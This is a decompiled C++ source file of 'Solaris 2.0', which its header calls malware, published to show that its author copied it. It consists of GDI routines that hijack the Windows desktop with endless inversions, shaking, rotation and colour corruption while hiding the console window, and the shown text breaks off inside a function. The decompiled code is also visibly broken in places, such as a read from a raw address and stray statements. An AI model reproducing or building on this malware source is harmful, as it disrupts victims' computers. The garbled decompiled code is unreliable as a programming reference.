/*
Decompiled source code of Solaris 2.0
This malware is made by a pro skidder named clxcq
I decompiled this because to prove that he skidded this
Decompiled By: Agniva
Optimised By: Agniva
*/
#include <Windows.h>
#include <iostream>
#include <math.h>
#include <cmath>
#include <time.h>

DWORD WINAPI HITBMAP(LPVOID)
{
    HWND v3; // rax
    int v4; // eax
    void* v5; // rax
    int h; // [rsp+30h] [rbp-10h]
    int w; // [rsp+34h] [rbp-Ch]
    HDC hdc; // [rsp+38h] [rbp-8h]
    GetDC(0);
    w = GetSystemMetrics(0);
    h = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0);
        //rand();
        //rand();
        v4 = rand();
        v5 = (void*)((unsigned int)(v4 % 40));
        SelectObject(hdc, v5);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        Sleep(0x3E8u);
    }
}

VOID WINAPI CircleInvert(int a1, int a2, int a3, int a4)
{
    int v4; // ebx
    int v5; // eax
    int v6; // ebx
    int v7; // eax
    HBRUSH v8; // rax
    HRGN hrgn; // [rsp+58h] [rbp-28h]
    HDC hdc; // [rsp+60h] [rbp-20h]

    hdc = GetDC(0i64);
    hrgn = CreateEllipticRgn(a1, a2, a1 + a3, a4 + a2);
    SelectClipRgn(hdc, hrgn);
    v4 = (unsigned __int8)(rand() % 255);
    v5 = rand();
    v6 = v4 | ((unsigned __int8)(v5 - v5 / -255) << 8);
    v7 = rand();
    v8 = CreateSolidBrush(v6 | ((unsigned __int8)(v7 - v7 / -255) << 16));
    SelectObject(hdc, v8);
    BitBlt(hdc, a1, a2, a3, a4, hdc, a1, a2, 0x2837E28u);
    DeleteObject(hrgn);
    ReleaseDC(0i64, hdc);
}

DWORD WINAPI Circle(LPVOID)
{
    HWND v3; // rax
    struct tagRECT Rect; // [rsp+20h] [rbp-30h] BYREF
    int v6; // [rsp+34h] [rbp-1Ch]
    int v7; // [rsp+38h] [rbp-18h]
    int v8; // [rsp+3Ch] [rbp-14h]
    int v9; // [rsp+40h] [rbp-10h]
    int v10; // [rsp+44h] [rbp-Ch]
    int j; // [rsp+48h] [rbp-8h]
    int i; // [rsp+4Ch] [rbp-4h]
    v3 = GetDesktopWindow();
    GetWindowRect(v3, &Rect);
    v10 = Rect.right - Rect.top - 500;
    v9 = Rect.bottom - Rect.top - 500;
    for (i = 0; ; ++i)
    {
        v8 = 1000;
        v7 = rand() % (v10 + 1000) - 500;
        v6 = rand() % (v9 + 1000) - 500;
        for (j = 0; j <= 999; j += 10)
        {
            CircleInvert(j - v7, v6 - v7 / 2, j, j);
            Sleep(0xAu);
            InvalidateRect(0i64, 0i64, 0);
        }
    }
}

int __fastcall CircleInvert2(int a1, int a2, int a3, int a4)
{
    HRGN ho; // [rsp+58h] [rbp-18h]
    HDC hdc; // [rsp+60h] [rbp-10h]

    hdc = GetDC(0i64);
    ho = CreateEllipticRgn(a1, a2, a1 + a3, a4 + a2);
    BitBlt(hdc, a1, a2, a3, a4, hdc, a1, a2, 0x5A0049u);
    DeleteObject(ho);
    ReleaseDC(0i64, hdc);
}

DWORD WINAPI Circle2(LPVOID)
{
    HWND v3; // rax
    struct tagRECT Rect; // [rsp+20h] [rbp-30h] BYREF
    int v6; // [rsp+30h] [rbp-20h]
    int v7; // [rsp+34h] [rbp-1Ch]
    int v8; // [rsp+38h] [rbp-18h]
    int v9; // [rsp+3Ch] [rbp-14h]
    int v10; // [rsp+40h] [rbp-10h]
    int v11; // [rsp+44h] [rbp-Ch]
    int j; // [rsp+48h] [rbp-8h]
    int i; // [rsp+4Ch] [rbp-4h]
    v3 = GetDesktopWindow();
    GetWindowRect(v3, &Rect);
    v11 = Rect.right - Rect.top - 500;
    v10 = Rect.bottom - Rect.top - 500;
    v9 = 0;
    for (i = 0; ; i %= 2)
    {
        v8 = 1000;
        v7 = rand() % (v11 + 1000) - 500;
        v6 = rand() % (v10 + 1000) - 500;
        for (j = 0; j <= 999; j += 100)
            CircleInvert2(v7 - j / 2, v6 - j / 2, j, j);
        Sleep(0x64u);
        if (!i)
            InvalidateRect(0i64, 0i64, 0);
        ++i;
    }
}

DWORD WINAPI CircleR(LPVOID)
{
    void* v3; // esp
    int cy; // ebx
    int v5; // eax
    int v6; // ebx
    int v7; // eax
    HDC hdc; // [esp+30h] [ebp-8h]

    v3 = alloca(16);
    hdc = GetDC(0);
    while (1)
    {
        cy = GetSystemMetrics(1);
        v5 = GetSystemMetrics(0);
        BitBlt(hdc, 0, 0, v5, cy, hdc, 0, 0, 0x330008u);
        Sleep(0x834u);
        v6 = GetSystemMetrics(1);
        v7 = GetSystemMetrics(0);
        BitBlt(hdc, 0, 0, v7, v6, hdc, 0, 0, 0x330008u);
        Sleep(0x834u);
    }
}

DWORD WINAPI Shake(LPVOID)
{
    int v1; // ebx
    long double i; // xmm0_8
    HDC v3; // esi
    double v4; // xmm0_8
    int v5; // [esp-1Ch] [ebp-34h]
    int cy; // [esp+Ch] [ebp-Ch]
    double v7; // [esp+10h] [ebp-8h]

    GetDC(0);
    v1 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    for (i = 0.0; ; i = fmod(v7 + 0.7853981633974483, 12.56637061435917))
    {
        v7 = i;
        v3 = GetDC(0);
        v5 = (int)(*(double*)64 * 4.0);
        v4 = *(double*)64;
        BitBlt(v3, (int)(v4 * 4.0), v5, v1, cy, v3, 0, 0, 0xCC0020u);
        Sleep(0x32u);
    }
}

__int64 Right()
{
    HWND v0; // rax
    __int64 result; // rax
    POINT Point; // [rsp+50h] [rbp-50h] BYREF
    int v3; // [rsp+58h] [rbp-48h]
    int v4; // [rsp+5Ch] [rbp-44h]
    int v5; // [rsp+60h] [rbp-40h]
    int v6; // [rsp+64h] [rbp-3Ch]
    struct tagRECT Rect; // [rsp+70h] [rbp-30h] BYREF
    time_t v8; // [rsp+80h] [rbp-20h]
    __int64 v9; // [rsp+88h] [rbp-18h]
    int v10; // [rsp+94h] [rbp-Ch]
    HDC hdcDest; // [rsp+98h] [rbp-8h]

    hdcDest = GetDC(0i64);
    v10 = 10;
    v9 = 5i64;
    v8 = time(0i64);
    while (1)
    {
        result = time(0i64) - v8;
        if (result >= v9)
            break;
        v0 = GetDesktopWindow();
        GetWindowRect(v0, &Rect);
        Point.x = Rect.left - v10;
        Point.y = Rect.top + v10;
        v3 = Rect.right - v10;
        v4 = Rect.top - v10;
        v5 = Rect.left + v10;
        v6 = Rect.bottom + v10;
        PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
    }
    return 0;
}

__int64 Left()
{
    HWND v0; // rax
    __int64 result; // rax
    POINT Point; // [rsp+50h] [rbp-50h] BYREF
    int v3; // [rsp+58h] [rbp-48h]
    int v4; // [rsp+5Ch] [rbp-44h]
    int v5; // [rsp+60h] [rbp-40h]
    int v6; // [rsp+64h] [rbp-3Ch]
    struct tagRECT Rect; // [rsp+70h] [rbp-30h] BYREF
    time_t v8; // [rsp+80h] [rbp-20h]
    __int64 v9; // [rsp+88h] [rbp-18h]
    int v10; // [rsp+94h] [rbp-Ch]
    HDC hdcDest; // [rsp+98h] [rbp-8h]

    hdcDest = GetDC(0i64);
    v10 = 10;
    v9 = 5i64;
    v8 = time(0i64);
    while (1)
    {
        result = time(0i64) - v8;
        if (result >= v9)
            break;
        v0 = GetDesktopWindow();
        GetWindowRect(v0, &Rect);
        Point.x = Rect.left + v10;
        Point.y = Rect.top - v10;
        v3 = Rect.right + v10;
        v4 = Rect.top + v10;
        v5 = Rect.left - v10;
        v6 = Rect.bottom - v10;
        PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
    }
    return 0;
}

DWORD WINAPI dizzy(LPVOID)
{
    while (1)
    {
        Left();
        Right();
    }
}

DWORD WINAPI h2(LPVOID)
{
    int v1; // ebx
    int v2; // eax
    int v3; // ebx
    int v4; // eax
    int v5; // eax
    HBRUSH h; // [rsp+50h] [rbp-30h]
    int cy; // [rsp+58h] [rbp-28h]
    int y; // [rsp+5Ch] [rbp-24h]
    int v9; // [rsp+60h] [rbp-20h]
    int w; // [rsp+64h] [rbp-1Ch]
    HDC hdc; // [rsp+68h] [rbp-18h]

    while (1)
    {
        hdc = GetDC(0i64);
        w = GetSystemMetrics(0);
        v9 = GetSystemMetrics(1);
        y = rand() % v9;
        cy = v9 - rand() % v9 + 109 - v9 / 2;
        v1 = (unsigned __int8)(rand() % 255);
        v2 = rand();
        v3 = v1 | ((unsigned __int8)(v2 - v2 / -255) << 8);
        v4 = rand();
        h = CreateSolidBrush(v3 | ((unsigned __int8)(v4 - v4 / -255) << 16));
        SelectObject(hdc, h);
        v5 = rand();
        BitBlt(hdc, 0, y, w, cy, hdc, v5 % 61 - 30, y, 0xCC0020u);
        PatBlt(hdc, 0, y, w, cy, 0x5A0049u);
        Sleep(0x32u);
        DeleteObject(h);
        DeleteDC(hdc);
    }
}

DWORD WINAPI h1(LPVOID)
{
    int y1; // ebx
    int v2; // eax
    int y; // [rsp+58h] [rbp-28h]
    int x; // [rsp+5Ch] [rbp-24h]
    int v5; // [rsp+60h] [rbp-20h]
    int v6; // [rsp+64h] [rbp-1Ch]
    HDC hdc; // [rsp+68h] [rbp-18h]

    while (1)
    {
        hdc = GetDC(0i64);
        v6 = GetSystemMetrics(0);
        v5 = GetSystemMetrics(1);
        x = rand() % v6;
        y = rand() % v5;
        y1 = rand() % 21 + y - 10;
        v2 = rand();
        BitBlt(hdc, x, y, 200, 200, hdc, v2 % 21 + x - 10, y1, 0xCC0020u);
        DeleteDC(hdc);
    }
}

DWORD WINAPI FIRST3(LPVOID)
{
    HWND v4; // eax
    int v5; // edi
    int v6; // ebx
    HDC v7; // esi
    int v8; // eax
    int v9; // eax
    int v10; // eax
    int v11; // eax
    int v12; // [esp-8h] [ebp-34h]
    int v13; // [esp-8h] [ebp-34h]
    int v14; // [esp-8h] [ebp-34h]
    int v15; // [esp-8h] [ebp-34h]
    HBITMAP ho; // [esp+Ch] [ebp-20h]
    int wDest; // [esp+10h] [ebp-1Ch]
    int hDest; // [esp+14h] [ebp-18h]
    int y; // [esp+18h] [ebp-14h]
    int x; // [esp+1Ch] [ebp-10h]
    int v21; // [esp+20h] [ebp-Ch]
    HDC hdc; // [esp+24h] [ebp-8h]

    v4 = GetConsoleWindow();
    ShowWindow(v4, 0);
    GetDC(0);
    v5 = GetSystemMetrics(0);
    wDest = v5;
    v6 = GetSystemMetrics(1);
    hDest = v6;
    while (1)
    {
        v7 = GetDC(0);
        hdc = CreateCompatibleDC(v7);
        ho = CreateCompatibleBitmap(v7, v5, v6);
        SelectObject(hdc, ho);
        x = rand() % v5;
        y = rand() % v6;
        BitBlt(hdc, 0, 0, v5, v6, v7, 0, 0, 0xCC0020u);
        v21 = 17;
        do
        {
            v12 = rand() % 11 + y - 5;
            v8 = rand();
            BitBlt(v7, x, y, 200, 200, v7, v8 % 11 + x - 5, v12, 0xCC0020u);
            v13 = rand() % 11 + y - 5;
            v9 = rand();
            BitBlt(v7, x, y, 200, -200, v7, v9 % 11 + x - 5, v13, 0xCC0020u);
            v14 = rand() % 11 + y - 5;
            v10 = rand();
            BitBlt(v7, x, y, -200, 200, v7, v10 % 11 + x - 5, v14, 0xCC0020u);
            v15 = rand() % 11 + y - 5;
            v11 = rand();
            BitBlt(v7, x, y, -200, -200, v7, v11 % 11 + x - 5, v15, 0xCC0020u);
            --v21;
        } while (v21);
        v6 = hDest;
        v5 = wDest;
        //AlphaBlend(v7, 0, 0, wDest, hDest, hdc, 0, 0, wDest, hDest, (_BLENDFUNCTION)6553600);
        DeleteDC(v7);
        DeleteDC(hdc);
        DeleteObject(ho);
    }
}

DWORD WINAPI FIRST(LPVOID)
{
    int v4; // ebx
    int v5; // eax
    HBITMAP h; // [rsp+58h] [rbp-28h]
    HDC hdcSrc; // [rsp+60h] [rbp-20h]
    HDC hdc; // [rsp+68h] [rbp-18h]
    void* lpvBits; // [rsp+70h] [rbp-10h]
    int nHeight; // [rsp+78h] [rbp-8h]
    int nWidth; // [rsp+7Ch] [rbp-4h]
    DWORD v13; // [rsp+80h] [rbp+0h]
    int j; // [rsp+84h] [rbp+4h]
    int v15; // [rsp+88h] [rbp+8h]
    int i; // [rsp+8Ch] [rbp+Ch]
    v13 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 3)
    {
        if (!i)
            RedrawWindow(0i64, 0i64, 0i64, 0x85u);
        hdc = GetDC(0i64);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0x830009u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v15 = 0;
        if (GetTickCount() - v13 > 0xEA60)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 100))
                v15 = rand() % 50;
            *((BYTE*)lpvBits + 4 * j + v15) += 9;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v4 = rand() % 3 - 1;
        v5 = rand();
        BitBlt(hdc, v5 % 3 - 1, v4, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}

DWORD WINAPI Cubes(LPVOID)
{
    int hSrc; // [rsp+60h] [rbp-10h]
    int wSrc; // [rsp+64h] [rbp-Ch]
    HDC hdcDest; // [rsp+68h] [rbp-8h]
    GetDC(0i64);
    wSrc = GetSystemMetrics(0);
    for (hSrc = GetSystemMetrics(1);
        ;
        StretchBlt(hdcDest, -10, -10, wSrc + 20, hSrc + 20, hdcDest, 0, 0, wSrc, hSrc, 0xCC0020u))
    {
        hdcDest = GetDC(0i64);
        (hdcDest, 4i64);
        StretchBlt(hdcDest, 10, 10, wSrc - 20, hSrc - 20, hdcDest, 0, 0, wSrc, hSrc, 0xCC0020u);
    }
}

DWORD WINAPI Squares(LPVOID)
{
    HWND v3; // rax
    int v4; // ebx
    int v5; // eax
    int v6; // ebx
    int v7; // eax
    HBRUSH v8; // rax
    int y1; // ebx
    int v10; // eax
    int v11; // eax
    int y; // [rsp+58h] [rbp-28h]
    int x; // [rsp+5Ch] [rbp-24h]
    int v15; // [rsp+60h] [rbp-20h]
    int v16; // [rsp+64h] [rbp-1Ch]
    HDC hdc; // [rsp+68h] [rbp-18h]
    v3 = GetConsoleWindow();
    ShowWindow(v3, 0);
    GetDC(0i64);
    v16 = GetSystemMetrics(0);
    v15 = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        x = rand() % v16;
        y = rand() % v15;
        v4 = (unsigned __int8)(rand() % 255);
        v5 = rand();
        v6 = v4 | ((unsigned __int8)(v5 - v5 / -255) << 8);
        v7 = rand();
        v8 = CreateSolidBrush(v6 | ((unsigned __int8)(v7 - v7 / -255) << 16));
        SelectObject(hdc, v8);
        y1 = rand() % 21 + y - 10;
        v10 = rand();
        BitBlt(hdc, x, y, 200, 200, hdc, v10 % 21 + x - 10, y1, 0x5A0049u);
        v11 = rand();
        Sleep(v11 % 10000);
    }
}

DWORD WINAPI Squares2(LPVOID)
{
    int v3; // ebx
    int v4; // ebx
    int v5; // eax
    HBRUSH v6; // rax
    int y1; // ebx
    int v8; // eax
    int v9; // eax
    int y; // [rsp+58h] [rbp-28h]
    int x; // [rsp+5Ch] [rbp-24h]
    int v13; // [rsp+60h] [rbp-20h]
    int v14; // [rsp+64h] [rbp-1Ch]
    HDC hdc; // [rsp+68h] [rbp-18h]
    GetDC(0i64);
    v14 = GetSystemMetrics(0);
    v13 = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        x = rand() % v14;
        y = rand() % v13;
        v3 = (unsigned __int8)(rand() % 244);
        v4 = v3 | ((unsigned __int8)(rand() % 155) << 8);
        v5 = rand();
        v6 = CreateSolidBrush(v4 | ((unsigned __int8)(v5 % 244) << 16));
        SelectObject(hdc, v6);
        y1 = rand() % 21 + y - 10;
        v8 = rand();
        BitBlt(hdc, x, y, 200, 200, hdc, v8 % 21 + x - 10, y1, 0x5A0049u);
        v9 = rand();
        Sleep(v9 % 900);
    }
}

DWORD WINAPI Squares3(LPVOID)
{
    int y1; // ebx
    int v4; // eax
    int v5; // eax
    int y; // [rsp+58h] [rbp-28h]
    int x; // [rsp+5Ch] [rbp-24h]
    int v9; // [rsp+60h] [rbp-20h]
    int v10; // [rsp+64h] [rbp-1Ch]
    HDC hdc; // [rsp+68h] [rbp-18h]
    GetDC(0i64);
    v10 = GetSystemMetrics(0);
    v9 = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        x = rand() % v10;
        y = rand() % v9;
        y1 = rand() % 21 + y - 10;
        v4 = rand();
        BitBlt(hdc, x, y, 200, 200, hdc, v4 % 21 + x - 10, y1, 0xEE0086u);
        v5 = rand();
        Sleep(1);
    }
}

DWORD WINAPI Dun(LPVOID)
{
    HWND v3; // rax
    int v4; // eax
    int v5; // eax
    int v6; // eax
    HGDIOBJ h; // [rsp+38h] [rbp-38h]
    HGDIOBJ ha; // [rsp+38h] [rbp-38h]
    HGDIOBJ hb; // [rsp+38h] [rbp-38h]
    HDC hdc; // [rsp+40h] [rbp-30h]
    int v12; // [rsp+4Ch] [rbp-24h]
    int v13; // [rsp+50h] [rbp-20h]
    int y; // [rsp+54h] [rbp-1Ch]
    int v15; // [rsp+5Ch] [rbp-14h]
    int w; // [rsp+60h] [rbp-10h]
    int k; // [rsp+64h] [rbp-Ch]
    int j; // [rsp+68h] [rbp-8h]
    int i; // [rsp+6Ch] [rbp-4h]
    v3 = GetConsoleWindow();
    ShowWindow(v3, 0);
    w = GetSystemMetrics(0);
    v15 = GetSystemMetrics(1);
    for (i = 0; ; i = (i + 1) % 9)
    {
        if (!i)
            RedrawWindow(0i64, 0i64, 0i64, 0x85u);
        for (j = 0; rand() % 3 > j; ++j)
        {
            for (k = 0; rand() % 10 > k; ++k)
            {
                y = rand() % w;
                v13 = v15 - rand() % v15 + 58 - v15 / 2;
                v12 = rand() % 3;
                hdc = GetDC(0i64);
                if (!v12)
                {
                    v4 = rand();
                    h = (HGDIOBJ)((unsigned __int8)(v4 % 100 - 101));
                    SelectObject(hdc, h);
                }
                if (v12 == 1)
                {
                    v5 = rand();
                    ha = (HGDIOBJ)((unsigned __int8)(v5 % 100 - 101) << 8);
                    SelectObject(hdc, ha);
                }
                if (v12 == 2)
                {
                    v6 = rand();
                    hb = (HGDIOBJ)((unsigned __int8)(v6 % 100 - 101) << 16);
                    SelectObject(hdc, hb);
                }
                PatBlt(hdc, 0, y, w, v13, 0x550009u);
            }
            rand();
            Sleep(0);
        }
    }
}

DWORD WINAPI Dun2(LPVOID)
{
    HWND v3; // rax
    int v4; // eax
    int v5; // eax
    int v6; // eax
    int v7; // eax
    HBRUSH h; // [rsp+58h] [rbp-38h]
    HBRUSH ha; // [rsp+58h] [rbp-38h]
    HBRUSH hb; // [rsp+58h] [rbp-38h]
    HDC hdc; // [rsp+60h] [rbp-30h]
    int v13; // [rsp+6Ch] [rbp-24h]
    int cy; // [rsp+70h] [rbp-20h]
    int y; // [rsp+74h] [rbp-1Ch]
    int v16; // [rsp+7Ch] [rbp-14h]
    int v17; // [rsp+80h] [rbp-10h]
    int k; // [rsp+84h] [rbp-Ch]
    int j; // [rsp+88h] [rbp-8h]
    int i; // [rsp+8Ch] [rbp-4h]
    v3 = GetConsoleWindow();
    ShowWindow(v3, 0);
    v17 = GetSystemMetrics(0);
    v16 = GetSystemMetrics(1);
    for (i = 0; ; i = (i + 1) % 9)
    {
        if (!i)
            RedrawWindow(0i64, 0i64, 0i64, 0x85u);
        for (j = 0; rand() % 3 > j; ++j)
        {
            for (k = 0; rand() % 10 > k; ++k)
            {
                y = rand() % v17;
                cy = v16 - rand() % v16 + 58 - v16 / 2;
                v13 = rand() % 3;
                hdc = GetDC(0i64);
                if (!v13)
                {
                    v4 = rand();
                    h = CreateSolidBrush((unsigned __int8)(v4 % 100 - 101));
                    SelectObject(hdc, h);
                }
                if (v13 == 1)
                {
                    v5 = rand();
                    ha = CreateSolidBrush((unsigned __int8)(v5 % 100 - 101) << 8);
                    SelectObject(hdc, ha);
                }
                if (v13 == 2)
                {
                    v6 = rand();
                    hb = CreateSolidBrush((unsigned __int8)(v6 % 100 - 101) << 16);
                    SelectObject(hdc, hb);
                }
                v7 = rand();
                BitBlt(hdc, 0, y, v17, cy, hdc, v7 % 40 - 30, y, 0xCC0020u);
            }
            rand();
            Sleep(0);
        }
    }
}

void __stdcall move()
{
    int v1; // eax
    int v2; // eax
    int v3; // eax
    int v4; // eax
    int v5; // eax
    int v6; // eax
    int v7; // eax
    int v8; // eax
    int v9; // eax
    int v10; // eax
    int v11; // eax
    HBRUSH h; // [rsp+58h] [rbp-38h]
    HBRUSH ha; // [rsp+58h] [rbp-38h]
    HBRUSH hb; // [rsp+58h] [rbp-38h]
    HDC hdc; // [rsp+60h] [rbp-30h]
    int v16; // [rsp+6Ch] [rbp-24h]
    int cy; // [rsp+70h] [rbp-20h]
    int y; // [rsp+74h] [rbp-1Ch]
    int v19; // [rsp+7Ch] [rbp-14h]
    int v20; // [rsp+80h] [rbp-10h]
    int k; // [rsp+84h] [rbp-Ch]
    int j; // [rsp+88h] [rbp-8h]
    int i; // [rsp+8Ch] [rbp-4h]

    v20 = GetSystemMetrics(0);
    v19 = GetSystemMetrics(1);
    for (i = 0; ; i = (i + 1) % 9)
    {
        if (!i)
            RedrawWindow(0i64, 0i64, 0i64, 0x85u);
        for (j = 0; rand() % 3 > j; ++j)
        {
            for (k = 0; rand() % 10 > k; ++k)
            {
                y = rand() % v20;
                cy = v19 - rand() % v19 + 58 - v19 / 2;
                v16 = rand() % 3;
                hdc = GetDC(0i64);
                if (!v16)
                {
                    v1 = rand();
                    h = CreateSolidBrush((unsigned __int8)(v1 % 100 - 101));
                    SelectObject(hdc, h);
                }
                if (v16 == 1)
                {
                    v2 = rand();
                    ha = CreateSolidBrush((unsigned __int8)(v2 % 100 - 101) << 8);
                    SelectObject(hdc, ha);
                }
                if (v16 == 2)
                {
                    v3 = rand();
                    hb = CreateSolidBrush((unsigned __int8)(v3 % 100 - 101) << 16);
                    SelectObject(hdc, hb);
                }
                v4 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v4 % 244 - 112, y, 0xCC0020u);
                v5 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v5 % 244 - 112, y, 0xCC0020u);
                v6 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v6 % 244 - 112, y, 0xCC0020u);
                v7 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v7 % 244 - 112, y, 0xCC0020u);
                v8 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v8 % 244 - 112, y, 0xCC0020u);
                v9 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v9 % 244 - 112, y, 0xCC0020u);
                v10 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v10 % 244 - 112, y, 0xCC0020u);
                v11 = rand();
                BitBlt(hdc, 0, y, v20, cy, hdc, v11 % 244 - 112, y, 0xCC0020u);
            }
            rand();
            Sleep(0);
        }
    }
}

VOID WINAPI whiteness()
{
    int x; // [rsp+5Ch] [rbp-14h]
    int cy; // [rsp+60h] [rbp-10h]
    int v3; // [rsp+64h] [rbp-Ch]
    HDC hdc; // [rsp+68h] [rbp-8h]

    GetDC(0i64);
    v3 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        x = rand() % v3;
        if ((rand() & 1) != 0)
        {
            if (rand() % 2 == 1)
                BitBlt(hdc, x, -1, -10, cy, hdc, x, 0, 0xEE0086u);
        }
        else
        {
            BitBlt(hdc, x, 1, 10, cy, hdc, x, 0, 0xEE0086u);
        }
    }
}

VOID WINAPI rotate()
{
    HWND v1; // rax
    POINT Point; // [rsp+50h] [rbp-40h] BYREF
    int v3; // [rsp+58h] [rbp-38h]
    int v4; // [rsp+5Ch] [rbp-34h]
    int v5; // [rsp+60h] [rbp-30h]
    int v6; // [rsp+64h] [rbp-2Ch]
    struct tagRECT Rect; // [rsp+70h] [rbp-20h] BYREF
    HDC hdcDest; // [rsp+88h] [rbp-8h]

    for (hdcDest = GetDC(0i64);
        ;
        PlgBlt(
            hdcDest,
            &Point,
            hdcDest,
            Rect.left,
            Rect.top,
            Rect.right - Rect.left,
            Rect.top - Rect.bottom,
            0i64,
            0,
            0))
    {
        hdcDest = GetDC(0i64);
        v1 = GetDesktopWindow();
        GetWindowRect(v1, &Rect);
        Point.x = Rect.left + 10;
        Point.y = Rect.top - 10;
        v3 = Rect.right + 10;
        v4 = Rect.top + 10;
        v5 = Rect.left - 10;
        v6 = Rect.bottom - 10;
        PlgBlt(
            hdcDest,
            &Point,
            hdcDest,
            Rect.left,
            Rect.top,
            Rect.right - Rect.left,
            Rect.top - Rect.bottom,
            0i64,
            0,
            0);
    }
}

DWORD WINAPI LAST(LPVOID)
{
    CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)move, 0i64, 0, 0i64);
    CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)rotate, 0i64, 0, 0i64);
    CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)whiteness, 0i64, 0, 0i64);
    Sleep(0xFFFFFFFF);
    return 0;
}

DWORD WINAPI LAST2(LPVOID)
{
    HANDLE v4; // [rsp+38h] [rbp-18h]
    HANDLE hObject; // [rsp+40h] [rbp-10h]
    HANDLE hThread; // [rsp+48h] [rbp-8h]
    hThread = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)move, 0i64, 0, 0i64);
    hObject = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)rotate, 0i64, 0, 0i64);
    v4 = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)whiteness, 0i64, 0, 0i64);
    Sleep(0x7530u);
    TerminateThread(hThread, 0);
    TerminateThread(hObject, 0);
    TerminateThread(v4, 0);
    CloseHandle(hThread);
    CloseHandle(hObject);
    CloseHandle(v4);
    Sleep(0xFFFFFFFF);
    return 0;
}

DWORD WINAPI Purple(LPVOID)
{
    void* v3; // rax
    int h; // [rsp+30h] [rbp-10h]
    int w; // [rsp+34h] [rbp-Ch]
    HDC hdc; // [rsp+38h] [rbp-8h]
    GetDC(0i64);
    w = GetSystemMetrics(0);
    for (h = GetSystemMetrics(1); ; PatBlt(hdc, 0, 0, w, h, PATINVERT))
    {
        hdc = GetDC(0i64);
        v3 = (void*)(65280);
        SelectObject(hdc, v3);
    }
}

DWORD WINAPI COLOR_RGB(LPVOID)
{
    int v3; // ebx
    int v4; // eax
    int v5; // ebx
    int v6; // eax
    void* v7; // rax
    int h; // [rsp+30h] [rbp-50h]
    int w; // [rsp+34h] [rbp-4Ch]
    HDC hdc; // [rsp+38h] [rbp-48h]
    GetDC(0i64);
    w = GetSystemMetrics(0);
    h = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        v3 = (unsigned __int8)(rand() % 255);
        v4 = rand();
        v5 = v3 | ((unsigned __int8)(v4 - v4 / -255) << 8);
        v6 = rand();
        v7 = (void*)(v5 | ((unsigned __int8)(v6 - v6 / -255) << 16));
        SelectObject(hdc, v7);
        PatBlt(hdc, 0, 0, w, h, 0x5A0049u);
        Sleep(0x3E8u);
    }
}

DWORD WINAPI COLOR_RGB2(LPVOID)
{
    HWND v3; // rax
    HBITMAP h; // [rsp+58h] [rbp-38h]
    HDC hdcSrc; // [rsp+60h] [rbp-30h]
    HDC hdc; // [rsp+68h] [rbp-28h]
    void* lpvBits; // [rsp+70h] [rbp-20h]
    int nHeight; // [rsp+78h] [rbp-18h]
    int nWidth; // [rsp+7Ch] [rbp-14h]
    DWORD v12; // [rsp+80h] [rbp-10h]
    int j; // [rsp+84h] [rbp-Ch]
    int v14; // [rsp+88h] [rbp-8h]
    int i; // [rsp+8Ch] [rbp-4h]
    v3 = GetConsoleWindow();
    ShowWindow(v3, 0);
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0i64);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}

void TaskDesk()
{
    int y1; // [rsp+5Ch] [rbp-14h]
    int v1; // [rsp+60h] [rbp-10h]
